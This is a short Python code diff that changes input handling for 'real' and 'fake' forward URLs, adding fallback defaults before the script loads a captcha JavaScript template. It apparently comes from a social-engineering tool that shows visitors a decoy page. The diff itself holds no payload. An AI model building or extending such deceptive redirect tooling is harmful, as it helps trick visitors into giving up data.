@@ -10,15 +10,23 @@ W = '\033[0m'  # white
 real_forward = os.getenv('REDIRECT')
 fake_forward = os.getenv('DISPLAY_URL')
 
-if real_forward is None:
-    real_forward = input(f'{G}[+] {C}Enter Real Forward URL :{W} ')
-else:
-    utils.print(f'{G}[+] {C}Real Forward URL :{W} '+real_forward)
+if not real_forward:
+    try:
+        real_forward = input(f'{G}[+] {C}Enter Real Forward URL :{W} ')
+    except Exception:
+        real_forward = ''
+if not real_forward:
+    real_forward = 'https://google.com'
+utils.print(f'{G}[+] {C}Real Forward URL :{W} ' + real_forward)
 
-if fake_forward is None:
-    fake_forward = input(f'{G}[+] {C}Enter Fake Forward URL :{W} ')
-else:
-    utils.print(f'{G}[+] {C}Fake Forward URL :{W} '+fake_forward)
+if not fake_forward:
+    try:
+        fake_forward = input(f'{G}[+] {C}Enter Fake Forward URL :{W} ')
+    except Exception:
+        fake_forward = ''
+if not fake_forward:
+    fake_forward = 'https://google.com/verify'
+utils.print(f'{G}[+] {C}Fake Forward URL :{W} ' + fake_forward)
 
 with open('template/captcha/js/main_temp.js', 'r') as location_temp:
     js_file = location_temp.read()
